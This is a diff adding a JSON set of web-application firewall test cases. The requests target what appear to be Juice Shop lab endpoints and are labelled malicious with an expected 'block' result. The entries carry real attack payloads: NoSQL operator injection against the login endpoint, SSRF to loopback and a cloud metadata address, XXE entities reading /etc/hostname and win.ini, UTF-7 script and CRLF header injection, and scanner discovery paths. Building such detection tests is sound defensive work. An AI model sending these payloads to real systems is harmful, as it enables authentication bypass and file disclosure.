+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "JAVA-012",
+    "category": "java-injection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="
+    },
+    "headers": {},
+    "body": null,
+    "description": "Base64 Java serialized-object header (rO0AB...), inert string",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "NOSQLI-001",
+    "category": "nosqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+    "description": "JSON operator injection shape",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "NOSQLI-002",
+    "category": "nosqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":{\"$gt\":\"\"},\"password\":\"x\"}",
+    "description": "JSON greater-than operator shape",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "NOSQLI-003",
+    "category": "nosqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":{\"$regex\":\".*\"},\"password\":\"x\"}",
+    "description": "Regex operator shape",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "NOSQLI-004",
+    "category": "nosqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":\"test@example.com\",\"password\":{\"$ne\":\"\"}}",
+    "description": "Operator object in password field",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "NOSQLI-005",
+    "category": "nosqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "{\"$ne\":null}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "NoSQL operator syntax in query text",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "NOSQLI-006",
+    "category": "nosqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":{\"$where\":\"return true\"},\"password\":\"x\"}",
+    "description": "Where operator-shaped JSON, input only",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "NOSQLI-007",
+    "category": "nosqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":{\"$in\":[\"a\",\"b\"]},\"password\":\"x\"}",
+    "description": "Array operator-shaped JSON",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "NOSQLI-008",
+    "category": "nosqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":{\"$exists\":true},\"password\":\"x\"}",
+    "description": "Existence operator-shaped JSON",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "NOSQLI-009",
+    "category": "nosqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":{\"$nin\":[]},\"password\":\"x\"}",
+    "description": "Not-in operator-shaped JSON",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "NOSQLI-010",
+    "category": "nosqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":{\"$eq\":\"admin@example.com\"},\"password\":\"x\"}",
+    "description": "Equality operator-shaped JSON",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SSRF-001",
+    "category": "ssrf",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://127.0.0.1:3000/"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Loopback URL marker; harness does not fetch parameter URLs",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SSRF-002",
+    "category": "ssrf",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://localhost/"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Localhost URL marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SSRF-003",
+    "category": "ssrf",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://127.0.0.1:8080/"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Local WAF endpoint URL marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SSRF-004",
+    "category": "ssrf",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://[::1]/"
+    },
+    "headers": {},
+    "body": null,
+    "description": "IPv6 loopback URL marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SSRF-005",
+    "category": "ssrf",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://169.254.169.254/latest/meta-data/"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Metadata-address pattern as inert text",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SSRF-006",
+    "category": "ssrf",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://2130706433/"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Decimal-encoded loopback IP",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SSRF-007",
+    "category": "ssrf",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "gopher://127.0.0.1:6379/_PING"
+    },
+    "headers": {},
+    "body": null,
+    "description": "gopher:// scheme to a loopback service port",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SSRF-008",
+    "category": "ssrf",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"comment\":\"reference URL: http://127.0.0.1:3000/\",\"rating\":1}",
+    "description": "URL in JSON content; no server-side request initiated by harness",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SSRF-009",
+    "category": "ssrf",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://127.0.0.1:1/"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Loopback URL with closed-port expectation",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SSRF-010",
+    "category": "ssrf",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "http://[::1]:8080/"
+    },
+    "headers": {},
+    "body": null,
+    "description": "IPv6 loopback with local WAF port",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XXE-002",
+    "category": "xxe",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test \"WAF_TEST\">]><root>&test;</root>",
+    "description": "Internal XML entity marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XXE-003",
+    "category": "xxe",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>",
+    "description": "Local-file XXE-shaped input in isolated lab",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XXE-004",
+    "category": "xxe",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/\">]><root>&xxe;</root>",
+    "description": "Loopback-only external-entity marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XXE-005",
+    "category": "xxe",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<!DOCTYPE foo [<!ENTITY a \"A\"><!ENTITY b \"&a;&a;\">]><foo>&b;</foo>",
+    "description": "Nested internal entity marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XXE-006",
+    "category": "xxe",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/hostname\" parse=\"text\"/></root>",
+    "description": "XInclude local-file marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XXE-007",
+    "category": "xxe",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root SYSTEM \"http://127.0.0.1:8080/xxe.dtd\"><root/>",
+    "description": "Loopback DTD reference marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XXE-008",
+    "category": "xxe",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % p SYSTEM \"file:///etc/hostname\">%p;]><root/>",
+    "description": "Parameter-entity marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XXE-009",
+    "category": "xxe",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY e SYSTEM \"file:///c:/windows/win.ini\">]><r>&e;</r>",
+    "description": "External entity to a Windows path",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XXE-010",
+    "category": "xxe",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY e SYSTEM \"expect://id\">]><r>&e;</r>",
+    "description": "External entity using the expect:// wrapper (inert)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XXE-011",
+    "category": "xxe",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE r PUBLIC \"-//LAB//WAF TEST//EN\" \"http://127.0.0.1:8080/p.dtd\"><r/>",
+    "description": "PUBLIC external DTD reference to loopback",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PROTO-002",
+    "category": "protocol-violation",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "X-Original-URL": "/admin"
+    },
+    "body": null,
+    "description": "Original URL override header",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PROTO-003",
+    "category": "protocol-violation",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "X-HTTP-Method-Override": "DELETE"
+    },
+    "body": null,
+    "description": "Method override header marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PROTO-004",
+    "category": "protocol-violation",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "X-Forwarded-Host": "example.invalid"
+    },
+    "body": null,
+    "description": "Forwarded host header marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PROTO-007",
+    "category": "protocol-violation",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "Accept-Language": "../../en"
+    },
+    "body": null,
+    "description": "Unusual Accept-Language value",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PROTO-011",
+    "category": "protocol-violation",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"q\":\"test\"}",
+    "description": "GET request carrying a body",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PROTO-012",
+    "category": "protocol-violation",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json; charset=utf-7"
+    },
+    "body": "{\"comment\":\"+ADw-script+AD4-alert(1)+ADw-/script+AD4-\",\"rating\":1}",
+    "description": "Disallowed UTF-7 charset carrying a UTF-7 encoded script tag",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PROTO-013",
+    "category": "protocol-violation",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test\u0000.md"
+    },
+    "headers": {},
+    "body": null,
+    "description": "NUL byte in a parameter value",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PROTO-014",
+    "category": "protocol-violation",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test\r\nSet-Cookie: lab=1"
+    },
+    "headers": {},
+    "body": null,
+    "description": "CRLF + header name in a parameter (header injection / response splitting)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "PROTO-015",
+    "category": "protocol-violation",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "Range": "bytes=10-5"
+    },
+    "body": null,
+    "description": "Invalid Range header (last byte before first byte)",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-001",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/",
+    "params": {},
+    "headers": {
+      "User-Agent": "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)"
+    },
+    "body": null,
+    "description": "Nikto scanner User-Agent",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-002",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/.env",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Configuration-file discovery path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-003",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/.git/config",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Git metadata discovery path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-004",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/wp-admin/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "WordPress admin discovery path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-005",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/phpmyadmin/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Database admin discovery path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-006",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/server-status",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Server status discovery path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-007",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/actuator/env",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Actuator environment discovery path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-008",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/cgi-bin/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "CGI directory discovery path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-009",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/backup.zip",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Backup archive discovery path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-010",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/config.php.bak",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Backup configuration discovery path marker",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-011",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "apple"
+    },
+    "headers": {
+      "User-Agent": "sqlmap/1.8 (https://sqlmap.org)"
+    },
+    "body": null,
+    "description": "sqlmap User-Agent on an otherwise normal search",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "SCAN-012",
+    "category": "scanner-detection",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/",
+    "params": {},
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+    },
+    "body": null,
+    "description": "Nmap NSE User-Agent",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  }
+]
